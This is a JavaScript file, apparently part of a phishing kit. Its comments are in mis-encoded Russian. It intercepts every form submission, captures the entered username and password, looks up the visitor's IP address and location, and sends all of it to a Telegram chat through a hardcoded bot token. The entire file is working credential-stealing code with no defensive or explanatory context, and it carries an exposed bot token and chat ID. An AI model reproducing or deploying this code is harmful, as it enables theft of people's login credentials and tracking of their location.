const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
let lastSendTime = 0;
function sendToTelegram(message) {
    const now = Date.now();
    const delay = Math.max(0, 1000 - (now - lastSendTime)); // –ú–∏–Ω–∏–º—É–º 1 —Å–µ–∫—É–Ω–¥–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏

    return new Promise(resolve => {
        setTimeout(() => {
            const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
            })
                .catch(err => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", err))
                .finally(() => resolve());

            lastSendTime = Date.now();
        }, delay);
    });
}

// –§—É–Ω–∫—Ü–∏—è —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è –¥–æ–º–µ–Ω–∞
async function hashDomain(domain) {
    try {
        const buffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain));
        const hashArray = Array.from(new Uint8Array(buffer));
        const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
        return `#${hashHex.slice(0, 8)}`; // –û—Å—Ç–∞–≤–∏–º –ø–µ—Ä–≤—ã–µ 8 —Å–∏–º–≤–æ–ª–æ–≤ —Ö–µ—à–∞
    } catch (err) {
        console.error("–û—à–∏–±–∫–∞ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è –¥–æ–º–µ–Ω–∞:", err);
        return "#error";
    }
}

// –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ IP
function getIPInfo() {
    return fetch("https://ipapi.co/json/")
        .then(response => {
            if (!response.ok) throw new Error("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ IP");
            return response.json();
        })
        .then(data => ({
            ip: data.ip,
            location: `${data.city || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}, ${data.region || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}, ${data.country_name || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}`,
            org: window.location.hostname,
        }))
        .catch(err => {
            console.error("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ IP:", err);
            return {
                ip: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                location: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                org: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
            };
        });
}

// –§—É–Ω–∫—Ü–∏—è —É–ø—Ä–æ—â–µ–Ω–Ω–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ User-Agent
function getSimplifiedUserAgent() {
    const userAgent = navigator.userAgent || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"];
    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"];
    const browser = browserMatches[0].split("/")[0]; // –ù–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞
    const os = osMatches[1].split(";")[0]; // –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞
    return `${browser} on ${os}`;
}

// –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è submit
async function handleSubmit(event) {
    event.preventDefault(); // –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã

    const formData = new FormData(event.target);
    const login = formData.get("user") || "–ù–µ —É–∫–∞–∑–∞–Ω–æ";
    const password = formData.get("passwd") || "–ù–µ —É–∫–∞–∑–∞–Ω–æ";
    const simplifiedUserAgent = getSimplifiedUserAgent();

    try {
        const info = await getIPInfo();
        const domainHashTag = await hashDomain(info.org);

        const message = `üöÄ *–ù–æ–≤–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã:*
---
- üõ°Ô∏è **–õ–æ–≥–∏–Ω:**
\`\`\`
${login}
\`\`\`
- üõ°Ô∏è **–ü–∞—Ä–æ–ª—å:**
\`\`\`
${password}
\`\`\`
- üåê **IP-–∞–¥—Ä–µ—Å:** ${info.ip}
- üìç **–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:** ${info.location}
- üñ•Ô∏è **User-Agent:** ${simplifiedUserAgent}
- üîó **–°—Ç—Ä–∞–Ω–∏—Ü–∞:** ${window.location.href}
- üè¢ **–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è:** ${info.org}
${domainHashTag}`;

        console.log("–°–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram –≥–æ—Ç–æ–≤–æ:", message);
        await sendToTelegram(message); // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
    } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–∞–Ω–Ω—ã—Ö:", err);
    } finally {
        console.log("–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–æ—Ä–º—ã.");
        event.target.reset(); // –°–±—Ä–æ—Å —Ñ–æ—Ä–º—ã –ø–æ—Å–ª–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏
    }
}

// –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ —Å–æ–±—ã—Ç–∏—è submit
document.addEventListener("submit", handleSubmit);
